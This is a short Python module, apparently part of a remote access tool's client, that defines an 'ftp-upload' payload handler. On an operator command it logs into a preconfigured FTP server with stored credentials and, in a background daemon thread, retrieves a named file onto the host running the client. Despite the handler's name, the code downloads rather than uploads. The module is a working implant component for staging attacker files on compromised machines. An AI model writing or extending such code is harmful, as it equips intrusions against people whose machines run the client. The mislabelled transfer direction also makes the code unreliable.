import ftplib
from payloads.absract_payload_handler import AbstractPayloadHandler
from client import settings
from threading import Thread
class FTPUploadPayloadHandler(AbstractPayloadHandler):
    @classmethod
    def get_platform(cls):
        return "cross_platform"

    def ftp_upload(self,file_name):
        self.myFTP.retrbinary('RETR %s'%file_name, open('%s'%file_name, 'wb').write)
        self.myFTP.quit()

    def execute_payload(self, data:bytes) -> str:
        '''
        server_addr,username,password,file=data[1],data[2],data[3],data[4]
        '''
        try:
            data=data.decode("utf-8")
            if not len(data.split())==2:
                return "Invalid format: ftp-upload file/dir\n"
            file_name=data.split()[1]
            self.myFTP = ftplib.FTP()
            self.myFTP.connect(settings.FTP_SERVER_ADDR,settings.FTP_SERVER_PORT)
            self.myFTP.login(settings.FTP_USER,settings.FTP_PASSWORD)
            t=Thread(target=self.ftp_upload,args=(file_name,))
            t.daemon=True
            t.start()
            return 'Upload for  {} started successfully\n'.format(file_name)
        except Exception as e:
            return "Command execution unsuccessful: {}\n".format(str(e))
